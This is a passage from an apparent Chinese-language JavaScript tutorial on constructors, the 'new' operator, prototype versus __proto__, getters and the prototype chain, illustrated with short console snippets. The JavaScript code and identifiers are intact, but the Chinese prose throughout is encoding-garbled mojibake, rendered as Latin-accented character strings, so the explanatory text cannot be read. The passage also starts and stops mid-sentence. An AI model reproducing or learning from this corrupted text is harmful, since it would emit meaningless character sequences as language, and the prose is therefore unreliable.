ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°Calculatoræœ¬èº«å°±å…·æœ‰ä¸€ç§ JSON ç»“æ„ï¼Œå®ƒå…·æœ‰å®ƒçš„ JSON å±æ€§ã€JSON æ–¹æ³• æˆ‘ä»¬æŠŠæ³¨æ„åŠ›æ”¾åœ¨let calc = new Calculator(1)è¿™ä¸€è¡Œä¸Š äº‹å®ä¸Šï¼Œè¿™ä¸¤ç§å®ç°æ–¹æ³•ï¼ˆç”¨classè¯­æ³•å’Œç”¨å‡½æ•°å®ç°ï¼‰çš„Calculatoræœ€ç»ˆå…·æœ‰ç›¸åŒçš„ JSON ç»“æ„ï¼Œå…¶ä¸­ï¼ŒåŸºäºå‡½æ•°çš„å®ç°æ›´æ¥è¿‘ JavaScript çš„æœ¬çœŸé€»è¾‘ï¼Œè€Œclassæ›´åƒæ˜¯ä¸€ç§è¯­æ³•ç³– **æ³¨æ„ï¼š**æ­¤å¤„ä¸è¦å°†ä¸¤ç§å®ç°æ–¹å¼çš„Calculatoråˆ†åˆ«å‘½åæˆCalculator1å’ŒCalculator2ï¼Œç„¶åé€šè¿‡Calculator1 == Calculator2æˆ–è€…Calculator1 === Calculator2å»æ¯”è¾ƒï¼Œå®ƒå°†æ°¸è¿œè¿”å›falseï¼Œå› ä¸ºä¸¤è€…çš„åœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ­£å¦‚[] == []å’Œ({}) == ({})çš„è¿”å›å€¼ä¹Ÿæ˜¯falseä¸€æ · é‚£ä¹ˆï¼Œæ ¹æ®æˆ‘ä»¬æ‰€æ³¨æ„åˆ°çš„å‡ ä¸ªç»†èŠ‚ï¼Œæˆ‘ä»¬çŒœæµ‹ï¼š è¿›è¡Œ new æ“ä½œæ—¶ï¼ŒJavaScript åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ JSON ç»“æ„ï¼Œè¿™ä¸ªç»“æ„ç»§æ‰¿è‡ªCalculatorçš„prototypeå±æ€§â€”â€”è¿™ä¸€è¿‡ç¨‹å¼•å…¥äº†æ–¹æ³• éšåï¼Œä»¥è¿™ä¸ªæ–°åˆ›å»ºçš„ JSON ç»“æ„ä¸ºthisï¼Œä¼ é€’å‚æ•°num=1å¹¶è¿è¡Œæ„é€ å™¨constructorä¸­çš„å†…å®¹â€”â€”è¿™ä¸€è¿‡ç¨‹å¼•å…¥äº†å±æ€§ è‡³äºé™æ€æ–¹æ³•åˆ™å¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬è°ƒç”¨é™æ€æ–¹æ³•å†™çš„æ˜¯Calculator.add``Calculator.subï¼Œé‚£ä¹ˆè¿™äº›é™æ€æ–¹æ³•ä¹Ÿè‡ªç„¶å¼•å…¥äºCalculatorçš„ JSON ç»“æ„æœ¬èº«ä¹‹ä¸­ å®ä¾‹åˆ›å»ºåï¼Œä¸ºäº†è¿½æº¯è¿™ä¸€è¿‡ç¨‹ï¼Œæ–°åˆ›å»ºçš„å®ä¾‹çš„ JSON ç»“æ„ä¼šå¸¦æœ‰constructorå±æ€§ï¼ŒæŒ‡å‘åˆ›å»ºå®ƒçš„æ„é€ å™¨ï¼Œåœ¨æ­¤å¤„ä¸ºCalculatorï¼ˆå‡½æ•°ï¼‰ï¼›å¸¦æœ‰__proto__å±æ€§ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯å®ƒç»§æ‰¿è¿‡æ¥çš„åœ°æ–¹ï¼Œåœ¨æ­¤å¤„ä¸ºCalculator.prototype æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡ŒéªŒè¯ æˆ‘ä»¬æ³¨æ„åˆ°ï¼ŒåŸºäºå‡½æ•°å®ç°çš„å†™æ³•ä¸­ï¼Œnew Calculator(1)çš„Calculatoræœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œäº‹å®ä¸Šå®ƒå°±æ˜¯constructorå‡½æ•°æœ¬èº« let calc = new Calculator(1) // åˆ›å»ºå®ä¾‹ï¼ˆä¸è®ºæ˜¯å“ªç§ç±»çš„å®ç°æ–¹æ³•ï¼‰ console.log(calc.constructor === Calculator) å³ä½¿ç”¨classè¯­æ³•åˆ›å»ºï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿçœ‹åˆ°æ–¹æ³•ä½äºCalculatorçš„prototypeä¹‹ä¸­ let calc = new Calculator(1) // åˆ›å»ºå®ä¾‹ï¼ˆä½¿ç”¨ class è¯­æ³•ï¼‰ console.log(calc.applyAdd === Calculator.prototype.applyAdd) console.log(calc.applySub === Calculator.prototype.applySub) ç»“åˆä¸Šé¢çš„ç»“è®ºï¼Œæ˜¾ç„¶ï¼Œä¸‹é¢è¡¨è¾¾å¼çš„è¿è¡Œç»“æœä¹Ÿæ˜¯true calc.applyAdd === calc.constructor.prototype.applyAdd calc.applySub === calc.constructor.prototype.applySub æ¥ä¸‹æ¥æˆ‘ä»¬éªŒè¯calcä¸‹é¢çš„__proto__ï¼Œå®ƒæŒ‡å‘äº†å®ƒçš„åŸå‹ let calc = new Calculator(1) // åˆ›å»ºå®ä¾‹ï¼ˆä¸è®ºæ˜¯å“ªç§ç±»çš„å®ç°æ–¹æ³•ï¼‰ console.log(calc.__proto__ === Calculator.prototype) console.log(calc.__proto__ === calc.constructor.prototype) æˆ‘ä»¬çœ‹åˆ°ï¼Œnew çš„è¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯æ ¹æ®ç±»åˆ›å»ºä¸€ä¸ª JavaScript å¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰çš„è¿‡ç¨‹ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š ä¸ºå®ä¾‹æ·»åŠ æ–¹æ³•ï¼šä»¥ç±»çš„prototypeä½œä¸ºåŸå‹â€œå¤åˆ¶â€å‡ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰ ä¸ºå®ä¾‹æ·»åŠ å±æ€§ã€è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼šè¿è¡Œç±»çš„æ„é€ å™¨constructor ä¸ºå®ä¾‹â€œæ·»åŠ â€constructorå’Œ__proto__å±æ€§ï¼Œåˆ†åˆ«æŒ‡å‘åˆ›å»ºå®ƒæ—¶çš„æ„é€ å™¨å’ŒåŸå‹ äº‹å®ä¸Šï¼Œä¸Šè¿°çš„æè¿°å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬å°†åœ¨ç¨åäºˆä»¥çº æ­£ 3.3 æ„é€ å™¨ constructor åˆšæ‰çš„ new æ“ä½œå®Œå…¨å¯ä»¥å†™æˆ let calc2 = new calc.constructor() è¿™æ„å‘³ç€ï¼Œåˆ›å»ºä¸€ä¸ªç±»çš„å«ä¹‰å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ„é€ å™¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªå®ä¾‹çš„å«ä¹‰å°±æ˜¯åœ¨ç»§æ‰¿çš„åŸºç¡€ä¸Šè¿è¡Œäº†è¿™ä¸ªæ„é€ å™¨å‡½æ•° ä¸ºäº†ç¡®ä¿ç»§æ‰¿è¿‡ç¨‹é¡ºåˆ©è¿›è¡Œï¼Œè¿™ä¸ªæ„é€ å™¨å‡½æ•°å¿…é¡»å«æœ‰ä»¥ä¸‹ç‰¹å¾ åŒ…å«prototypeå±æ€§ è€Œåœ¨ JavaScript ä¸­ï¼Œä»»æ„å‡½æ•°éƒ½é»˜è®¤å…·æœ‰prototypeå±æ€§ï¼Œå› æ­¤ï¼Œä»»æ„å‡½æ•°éƒ½ç¬¦åˆä¸€ä¸ªæ„é€ å™¨çš„æ ‡å‡†ï¼Œä»»æ„å‡½æ•°éƒ½æ˜¯ä¸€ä¸ªæ„é€ å™¨ï¼Œå¯ç”¨äºç”Ÿæˆç±»å®ä¾‹ function TestClass() {} let test = new TestClass() ä»¥ä¸Šä»£ç å¹¶ä¸ä¼šæŠ¥é”™ åœ¨ JavaScript ä¸­ï¼Œç»§æ‰¿è¿™ä¸ªæ¦‚å¿µè´¯å½»åœ¨è®¸å¤šæ“ä½œä¸­ï¼Œæ¯ä¸€ä¸ªæ–°çš„ JSON ç»“æ„çš„è¯ç”Ÿï¼Œéƒ½è¿›è¡Œäº†ç±»ä¼¼ new çš„é€»è¾‘ï¼Œå› æ­¤ï¼Œä»»ä½•ä¸€ä¸ªå¯¹è±¡ï¼ˆé™¤äº†nullï¼‰éƒ½å…·æœ‰constructorå±æ€§ï¼ŒåŒ…æ‹¬æ„é€ å™¨æœ¬èº« æ„é€ å™¨æœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå½“æˆ‘ä»¬å¾ªç¯è®¿é—®constructoræ—¶å°†å¾—åˆ° JavaScript é¢„å®šä¹‰çš„æ„é€ å™¨Functionï¼Œè€ŒFunctionçš„æ„é€ å™¨ä»ç„¶æ˜¯å®ƒæœ¬èº« Function.constructor === Function ä»¥ä¸Šè¡¨è¾¾å¼å°†è¿”å›true æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºå¦‚ä¸‹ç°è±¡ æ„é€ å™¨é“¾çš„å°½å¤´æ˜¯Function Functionçš„æ„é€ å™¨æ˜¯Functionæœ¬èº« ä¸‹é¢è¿™å¼ å›¾æ›´åŠ åœ°è¶‹è¿‘æœ¬è´¨ï¼Œå¯ä»¥ç¨åå†æ¥ä½“æ‚Ÿ 3.4 åŸå‹å’Œç»§æ‰¿ å½“æˆ‘ä»¬è°ˆè®º JavaScript çš„åŸå‹ï¼Œå®é™…ä¸Šæ˜¯åœ¨è°ˆè®ºå¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»ï¼Œæœ‰ç»§æ‰¿å°±æœ‰åŸå‹ï¼Œæœ‰åŸå‹å°±æœ‰ç»§æ‰¿ åŸå‹çš„å®šä¹‰å¤§è‡´å¯ä»¥æè¿°ä¸ºï¼šAå’ŒBæ˜¯ä¸¤ä¸ª JSON ç»“æ„ï¼ŒBç»§æ‰¿äºAï¼Œå…·æœ‰Açš„å…¨éƒ¨å†…å®¹ï¼Œé‚£ä¹ˆç§°Aå°±æ˜¯Bçš„åŸå‹ åœ¨ JavaScript ä¸­ï¼Œä¸€ä¸ª JSON ç»“æ„å°±å¯ä»¥ç§°ä¸ºæ˜¯ä¸€ä¸ªå…·ä½“çš„å¯¹è±¡ï¼Œç”šè‡³åŒ…æ‹¬Number``String nullæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºç©ºï¼Œå¦‚æœæŠŠå¯¹è±¡ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ç”»ä¸€ä¸ªé—ä¼ ç³»è°±å›¾ï¼Œé‚£ä¹ˆnullå°±æ˜¯è¿™å¼ å›¾ä¸Šæœ€åŸå§‹çš„ç¥–å…ˆ æˆ‘ä»¬å…·æœ‰æ„é€ å™¨å‡½æ•°Calculatorï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ª JSON ç»“æ„ï¼ˆå¯¹è±¡ï¼‰ï¼Œå…·æœ‰ä¸€ä¸ªå±æ€§prototypeï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªå±æ€§ç†è§£ä¸ºåˆ›å»ºå®ä¾‹æ—¶çš„â€œæ¨¡æ¿â€ï¼Œå½“åˆ›å»ºå®ä¾‹æ—¶ï¼Œå®ä¾‹ä¼šç»§æ‰¿è¿™ä¸ªâ€œæ¨¡æ¿â€çš„å…¨éƒ¨å†…å®¹ å½“æˆ‘ä»¬å•ç‹¬è¯´è°æ˜¯åŸå‹æ—¶ï¼Œå…¶å®å¹¶æ²¡æœ‰æ„ä¹‰ï¼ŒCalculatorçš„prototypeä¸æ˜¯Calcualtorçš„åŸå‹ï¼Œè€Œæ˜¯Calculatoræ‰€è¦åˆ›å»ºçš„å®ä¾‹ï¼ˆcalcï¼‰çš„åŸå‹ï¼Œäº‹å®ä¸Šï¼Œè¿™é‡Œå‘½åä¸ºprototypeï¼ˆè‹±æ–‡è¯‘ä¸ºâ€œåŸå‹â€ï¼‰é€ æˆäº†é‡å¤§çš„æ­§ä¹‰ï¼Œç»å¸¸å¯¹åˆå­¦è€…ç”šè‡³ä»ä¸šå¤šå¹´çš„ç¨‹åºå‘˜é€ æˆå·¨å¤§å›°æ‰°ï¼Œä¸ºäº†æ–¹ä¾¿è¡¨è¿°ã€é¿å…æ­§ä¹‰ï¼Œæˆ‘ä»¬ä¹‹åå°†æŠŠæ„é€ å™¨çš„prototypeç§°ä¸ºæ„é€ å™¨çš„â€œåŸå‹æ¨¡æ¿â€ æ„é€ å™¨Calculatoråˆ›å»ºå‡ºå®ä¾‹calcåï¼Œcalcå«æœ‰ä¸€ä¸ªå±æ€§__proto__ï¼Œè¿™ä¸ªå±æ€§å³ä¸ºcalcçš„åŸå‹ åˆšæ‰æˆ‘ä»¬ä¹Ÿæåˆ°Calculator.prototypeä¹Ÿæ˜¯calcçš„åŸå‹ï¼Œæ‰€ä»¥å®ƒä»¬ä¸¤ä¸ªæ˜¯ç­‰ä»·çš„ï¼Œä¸‹é¢çš„è¡¨è¾¾å¼å°†è¿”å›true calc.__proto__ === Calculator.prototype æˆ‘ä»¬å¯ä»¥ç”¨ä¸€å¼ å›¾æè¿°è¿™ç§å…³ç³»ï¼Œä¸‹å›¾ä¸­çš„prototypeå’Œ__proto__åœ¨å†…å­˜ä¸­å…·æœ‰å®Œå…¨ç›¸åŒçš„åœ°å€ï¼Œåªæ˜¯å®ƒä»¬æ‰€éš¶å±çš„ JSON ç»“æ„ä¸ä¸€æ · å½“è®¿é—®calcä¸‹çš„applyAddï¼Œå¦‚æœcalcè‡ªå·±æ²¡æœ‰applyAddï¼Œåˆ™ä¼šä»å®ƒçš„åŸå‹ä¸­å»æŸ¥æ‰¾ï¼Œä»è€Œå®ç°ç»§æ‰¿ å‡ ä¹æ‰€æœ‰ JavaScript ä¸­çš„å¯¹è±¡éƒ½æœ‰åŸå‹ï¼Œåœ¨ JavaScript ä¸­ï¼Œå¯ä»¥è®¿é—®ä»»ä½•å¯¹è±¡çš„__proto__å±æ€§æŸ¥çœ‹å®ƒçš„åŸå‹ å¦ä¸€æ–¹é¢ï¼Œæœ‰åŸå‹å°±æœ‰ç»§æ‰¿ï¼Œæœ‰ç»§æ‰¿å°±æœ‰ç›¸åº”çš„æ„é€ å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä»»ä½•å¯¹è±¡çš„constructorå±æ€§æŸ¥çœ‹å®ƒçš„æ„é€ å™¨ 3.5 åŸå‹å¯¹è±¡ prototype å’Œ proto é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ†è¾¨æ¸…æ¥šprototypeå’Œ__proto__çš„åŒºåˆ«ï¼Œä»¥Calculatorä¸ºä¾‹ï¼Œè¿™ä¸ªæ„é€ å™¨å‡½æ•°çš„åŸå‹å¹¶ä¸æ˜¯Calculator.prototypeï¼Œè€Œæ˜¯Calculator.__proto__ï¼Œcalcçš„åŸå‹æ˜¯calc.__proto__ç­‰äºCalculator.prototype æ¯ä¸€ä¸ªå®ä¾‹éƒ½ç”±å®ƒæ‰€å¯¹åº”çš„æ„é€ å™¨æ‰€åˆ›å»ºï¼Œå› æ­¤æ¯ä¸€ä¸ªå®ä¾‹éƒ½å…·æœ‰constructorå’Œ__proto__å±æ€§ï¼Œå®ä¾‹çš„constructor.prototypeçš„åœ°å€ä¸å®ä¾‹çš„__proto__ä¸€è‡´ ä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä»¬å¾ªç¯è®¿é—®__proto__æ—¶ï¼Œæœ€ç»ˆå°†æŒ‡å‘nullï¼Œè€Œå½“æˆ‘ä»¬å¾ªç¯è®¿é—®constructor.prototypeæ—¶ï¼Œæœ€ç»ˆå°†ä¼šç»™å‡ºç›¸åŒçš„ç»“æœ è¿™æ˜¯å› ä¸ºä¸€ä¸ªæ„é€ å™¨çš„â€œåŸå‹æ¨¡æ¿â€çš„æ„é€ å™¨å°±æ˜¯æ„é€ å™¨æœ¬èº« Number.prototype.constructor === Number Object.prototype.constructor === Object Function.prototype.constructor === Function Calculator.prototype.constructor === Calculator calc.constructor.prototype.constructor === calc.constructor ä»¥ä¸Šè¡¨è¾¾å¼éƒ½å°†è¿”å›true è¿™ç§â€œå¾ªç¯è‡ªå¼•ç”¨â€çš„é€»è¾‘æˆ–è®¸ä¼šæœ‰äº›éš¾ä»¥ç†è§£å’Œè®°å¿†ï¼Œä½†å®ƒè¿™ä¹ˆè®¾è®¡æ˜¯æœ‰å®ƒçš„æ„ä¹‰æ‰€åœ¨çš„ å¦‚æœæˆ‘ä»¬å°†prototypeçš„constructorä¿®æ”¹æˆå…¶å®ƒçš„å°†ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿä¾‹å¦‚ Calculator.prototype.constructor = Number let calc = new Calculator(1) ç„¶åæˆ‘ä»¬è®¿é—®calc.constructorï¼Œå®ƒå°†è¿”å›Numberæ„é€ å™¨ è®©æˆ‘ä»¬æŸ¥çœ‹calcçš„ JSON ç»“æ„ **æ³¨æ„ï¼š**è¿™é‡Œçš„&lt;prototype&gt;ï¼ˆåœ¨chromiumå†…æ ¸çš„æµè§ˆå™¨å¯èƒ½æ˜¾ç¤ºçš„æ˜¯[[Prototype]]ï¼‰ï¼Œå…¶å®å°±æ˜¯calcçš„åŸå‹calc.__proto__äº¦å³Calculator.prototype å› æ­¤ï¼Œcalcçš„contructorå±æ€§å¹¶ä¸æ˜¯è¢«æ·»åŠ ä¸Šå»çš„ï¼Œè€Œæ˜¯ç»§æ‰¿è‡ªprototypeçš„ï¼Œè¿™æ˜¯å¯¹å…ˆå‰â€œnew åšäº†ä»€ä¹ˆâ€çš„æ€»ç»“çš„ç¬¬ä¸€ä¸ªä¿®æ­£ï¼Œè¿™ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆä¸€ä¸ªæ„é€ å™¨çš„prototype.constructoré»˜è®¤æŒ‡å‘è¿™ä¸ªæ„é€ å™¨æœ¬èº« ä¸constructor.prototypeä¸åŒçš„æ˜¯ï¼Œ__proto__å°†ç›´æ¥æŒ‡å‘å½“å‰çš„ JSON ç»“æ„ç»§æ‰¿è‡ªå“ªé‡Œ // Calculator è¯·é‡æ–°å£°æ˜ä»¥è¦†ç›–å‰é¢å¯¹ prototype.constructor çš„ä¿®æ”¹ let calc = new Calculator(1) calc.constructor.prototype === calc.__proto__ calc.constructor.prototype.constructor.prototype === calc.__proto__.__proto__ calc.constructor.prototype.constructor.prototype === calc.constructor.prototype è¿è¡Œç»“æœå¦‚ä¸‹ å¯¹äºç¬¬ä¸€æ¡è¿è¡Œç»“æœæ˜¯æ˜¾ç„¶çš„ å¯¹äºç¬¬ä¸‰æ¡è¿è¡Œç»“æœï¼Œæ­£å¦‚æˆ‘ä»¬åˆšæ‰æ‰€æåˆ°çš„ï¼Œprototypeçš„constructorå°†æŒ‡å‘calc.constructorï¼Œä»è€Œå½¢æˆä¸€ç§â€œå¾ªç¯è‡ªå¼•ç”¨â€ å¯¹äºç¬¬äºŒæ¡è¿è¡Œç»“æœï¼Œæˆ‘ä»¬è§‚å¯Ÿcalc.__proto__.__proto__çš„å†…å®¹ æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œcalc.__proto__å°±æ˜¯Calculator.prototypeï¼Œå®ƒæ˜¯ä¸€ä¸ª JSON ç»“æ„ï¼Œè¿™ä¸ª JSON ç»“æ„çš„åŸå‹åº”å½“æ˜¯ä¸€ä¸ª JavaScript é¢„å®šä¹‰çš„æ„é€ å™¨Objectåˆ›å»ºçš„ calc.__proto.__proto__ === Object.prototype //true è‡³äºä¸ºä»€ä¹ˆcalc.__proto__ï¼ˆå³Calculator.prototypeï¼‰çš„constructorå±æ€§ä¸é»˜è®¤æŒ‡å‘Objectä»¥è¿½æ±‚ç»Ÿä¸€ï¼Œè¿™æˆ–è®¸å°±æ˜¯å…ˆå‰æåˆ°çš„ JavaScript çš„å†…åœ¨é€»è¾‘ä¸ºäº†ç»§æ‰¿æ–¹ä¾¿çš„ç‰¹æ€§å§ ç°åœ¨ï¼Œæˆ‘ä»¬è¿›è¡Œç¬¬äºŒä¸ªå¯¹å…ˆå‰â€œnew åšäº†ä»€ä¹ˆâ€çš„æ€»ç»“çš„çº é”™ æˆ‘ä»¬æ£€æŸ¥calcè¿™ä¸ªå¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰æœ¬èº«çš„å±‚çº§æ˜¯å¦å…·æœ‰__proto__å±æ€§ Object.hasOwnProperty.call(calc, '__proto__') //false å¯è§å…¶å®calcæœ¬èº«å¹¶ä¸å…·æœ‰__proto__å±æ€§ åœ¨ JavaScript ä¸­ï¼Œå½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„Aå±æ€§ï¼Œå¦‚æœå½“å‰å¯¹è±¡çš„ JSON ç»“æ„ä¸­æ‰¾ä¸åˆ°Aå±æ€§ï¼ŒJavaScript ä¼šä»å®ƒçš„åŸå‹ä¸­å»å¯»æ‰¾ ç”±äºè¿™ä¸ªç‰¹æ€§çš„å­˜åœ¨ï¼Œå¦‚æœå®ƒçš„åŸå‹ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ª JSON ç»“æ„ï¼‰ä¸­æ‰¾ä¸åˆ°ï¼Œä¼šä»å®ƒçš„åŸå‹çš„åŸå‹ä¸­å»æ‰¾ï¼Œç›´åˆ°åŸå‹ä¸ºnullä¹Ÿæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›undefined **æ³¨æ„ï¼š**äº‹å®ä¸Šï¼Œâ€œåŸå‹â€è¿™ä¸ªæ¦‚å¿µæŒ‡çš„æ˜¯ç¨‹åºè¿è¡Œçš„å†…åœ¨é€»è¾‘ï¼Œè€Œä¸æ˜¯__proto__è¿™äº›å±æ€§ï¼Œæ˜¯ä¸å®¹å¤–éƒ¨ä¿®æ”¹çš„ï¼Œæ¢å¥è¯è¯´ï¼Œ__proto__é»˜è®¤æŒ‡å‘äº†åŸå‹çš„åœ°å€ï¼Œè€Œå¹¶ä¸æ˜¯è¯´æ”¹å˜__proto__åˆ™æ”¹å˜äº†åŸå‹ è¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡ä¿®æ”¹Object.prototype.a = 1ï¼Œç„¶åè¿è¡ŒObject.defineProperty(calc, '__proto__', { value: 123 })ä½¿å¾—calc.__proto__çš„å€¼å˜ä¸º123ï¼Œç„¶åè®¿é—®calc.aè¿›è¡ŒéªŒè¯ï¼Œä¼šå‘ç°å®ƒè¿”å›çš„ç»“æœæ˜¯1 æˆ‘ä»¬è¿½æº¯å®ƒçš„åŸå‹ Object.hasOwnProperty.call(calc.__proto__, '__proto__') Object.hasOwnProperty.call(calc.__proto__.__proto__, '__proto__') Object.hasOwnProperty.call(calc.__proto__.__proto__.__proto__, '__proto__') ç¬¬ä¸€è¡Œè¿”å›äº†falseï¼Œcalc.__proto__å³Calculator.prototypeï¼Œå®ƒçš„åŸå‹çš„ JSON ç»“æ„æœ¬èº«ä¹Ÿä¸å…·æœ‰__proto__å±æ€§ ç¬¬äºŒè¡Œè¿”å›äº†trueï¼Œæˆ‘ä»¬å†æ¬¡æ‰“å°calc.__proto__.__proto__çš„ç»“æœ è¿™ä¸ªç»“æœå’ŒObject.prototypeä¸€è‡´ æˆ‘ä»¬å¯ä»¥ä»Object.prototypeçš„ JSON ç»“æ„ä¸­çœ‹åˆ°ï¼Œå®ƒå«æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œä½†æ˜¯å®ƒæ˜¯ä¸€ä¸ª Getterï¼Œè®¿é—®__proto__å±æ€§å°†è¿è¡Œè¿™ä¸ª Getter å‡½æ•°ï¼Œå°†è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ä½œä¸º__proto__å±æ€§çš„å€¼ æ‰€è°“ Getterï¼Œå°±æ˜¯æŒ‡ä¸€ä¸ªå±æ€§çš„å€¼ä¸ä¸€ä¸ªå‡½æ•°ç›¸ç»‘å®šï¼Œè®¿é—®è¿™ä¸ªå±æ€§ï¼Œå®ƒçš„å€¼ä¼šé€šè¿‡ä¸€ä¸ªå‡½æ•°åŠ¨æ€è·å–ï¼Œè¿™ä¸ªå‡½æ•°ç§°ä¸ºè¿™ä¸ªå±æ€§çš„ Getter å‡½æ•° ç›¸åº”çš„ï¼Œè¿˜æœ‰ Setter è¿™ä¸€æ¦‚å¿µï¼Œå½“é€šè¿‡èµ‹å€¼è¯­å¥=å¯¹è¿™ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼æ—¶ï¼Œå®é™…ä¸Šæ˜¯ä»¥=åé¢çš„å€¼ä¸ºå‡½æ•°çš„å‚æ•°è°ƒç”¨äº†å®ƒçš„ Setter å‡½æ•° å¯¹äº__proto__è¿™ä¸€ Getterï¼Œå®ƒçš„é€»è¾‘åœ¨ JavaScript è§£é‡Šå™¨çš„ä»£ç ä¸­å¾—åˆ°å®šä¹‰ï¼Œè€Œå¹¶ä¸æ˜¯ JavaScript è¯­è¨€æœ¬èº«èƒ½å¤Ÿå®šä¹‰çš„ æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿è¡Œå¦‚ä¸‹ä»£ç åˆ¤æ–­ä¸€ä¸ªå®ƒæ˜¯ä¸æ˜¯ä¸€ä¸ª Getter Object.getOwnPropertyDescriptor(Object.prototype, '__proto__') è¿è¡Œç»“æœå¦‚ä¸‹ æ˜¾ç„¶__proto__çš„å€¼æ˜¯é€šè¿‡get: __proto__()åŠ¨æ€è·å–çš„ æˆ‘ä»¬è¿è¡ŒObject.getOwnPropertyDescriptor(Object.prototype, '__proto__').get.call(calc)ï¼ˆæ„æ€æ˜¯ä»¥calcä¸ºè¿™ä¸ª Getter çš„ this æŒ‡é’ˆè¿è¡Œè¿™ä¸ª Getter å‡½æ•°ï¼‰çš„ç»“æœå’Œcal.__proto__ä¸€æ · å› æ­¤ï¼Œcalcä¸­çš„__proto__å®é™…ä¸Šæ˜¯é€šè¿‡ JavaScript ä¸­å±‚å±‚å‘åŸå‹è®¿é—®çš„æœºåˆ¶å¯»æ‰¾åˆ°çš„ï¼Œå®ƒæœ€ç»ˆé€šè¿‡åŸå‹é“¾æŒ‡å‘äº†Object.prototypeä¸­çš„__proto__è¿™ä¸€å¸¦æœ‰ Getter çš„å±æ€§ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„ä»£ç å°†Object.prototypeçš„__proto__ä¿®æ”¹ä¸ºä¸€ä¸ªç¡®å®šçš„ã€ä¸å¸¦æœ‰ Getter çš„å€¼ Object.defineProperty(Object.prototype, '__proto__', { value: 123 }) ç„¶åæˆ‘ä»¬ä¼šå‘ç°ä¼—å¤šå¯¹è±¡çš„__proto__éƒ½å˜æˆäº†123ï¼ŒåŒ…æ‹¬calcå’ŒCalculator.prototype ä¸ºäº†æ¢æŸ¥calcç»§æ‰¿çš„é€»è¾‘ï¼Œæˆ‘ä»¬åˆ·æ–°ä¸€ä¸‹ç½‘é¡µæˆ–è€…é‡ç½®ä¸€ä¸‹ JavaScript ç¯å¢ƒï¼Œé‡æ–°åˆ›å»ºCalculatorå¯¹è±¡å’Œcalcå®ä¾‹ï¼Œè¿è¡Œå¦‚ä¸‹ä»£ç å¯¹Calculator.prototypeçš„__proto__è¿›è¡Œä¿®æ”¹ Object.defineProperty(Calculator.prototype, '__proto__', { value: 123 }) ç„¶åè®¿é—®calc.__proto__ï¼Œä¼šå‘ç°å®ƒè¿”å›äº†123 ç”±æ­¤æˆ‘ä»¬å¯¹â€œnew åšäº†ä»€ä¹ˆâ€è¿›è¡Œç¬¬äºŒæ¬¡ä¿®æ­£ï¼šå®é™…ä¸Š__proto__å±æ€§ä¹Ÿä¸æ˜¯è¢«æ·»åŠ ä¸Šå»çš„ï¼Œè€Œæ˜¯ç»§æ‰¿è‡ªæ„é€ å™¨çš„prototypeå±æ€§ å†ä¸€æ¬¡åˆ·æ–°ç½‘é¡µæˆ–è€…é‡ç½® JavaScript ç¯å¢ƒï¼ŒæŸ¥çœ‹Object.prototypeçš„__proto__å€¼ Object.prototype.__proto__ ç»¼åˆä¸Šè¿°æ¢ç´¢å’Œæµ‹è¯•ï¼Œæˆ‘ä»¬å¾—åˆ°å¦‚ä¸‹ç»“è®º ä¸€ä¸ªæ„é€ å™¨çš„prototypeçš„æ„é€ å™¨æŒ‡å‘è¿™ä¸ªæ„é€ å™¨æœ¬èº« è®¿é—®__proto__ä¼šé€šè¿‡åŸå‹é“¾ç»§æ‰¿Object.prototype.__proto__çš„ç»“æœ __proto__çš„å°½å¤´æ˜¯null åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰çš„åŸå‹å¯é€šè¿‡å®ƒçš„__proto__å±æ€§åæ˜  3.6 ç»§æ‰¿ä¸åŸå‹é“¾ï¼šnew åˆ°åº•åšäº†ä»€ä¹ˆ é€šè¿‡ä¸Šé¢çš„æ¢ç´¢ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å‡ºâ€œnew åšäº†ä»€ä¹ˆâ€çš„æœ€ç»ˆç­”æ¡ˆï¼š new çš„è¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯æ ¹æ®æ„é€ å™¨çš„prototypeå±æ€§åˆ›å»ºä¸€ä¸ª JavaScript å¯¹è±¡ï¼ˆJSON 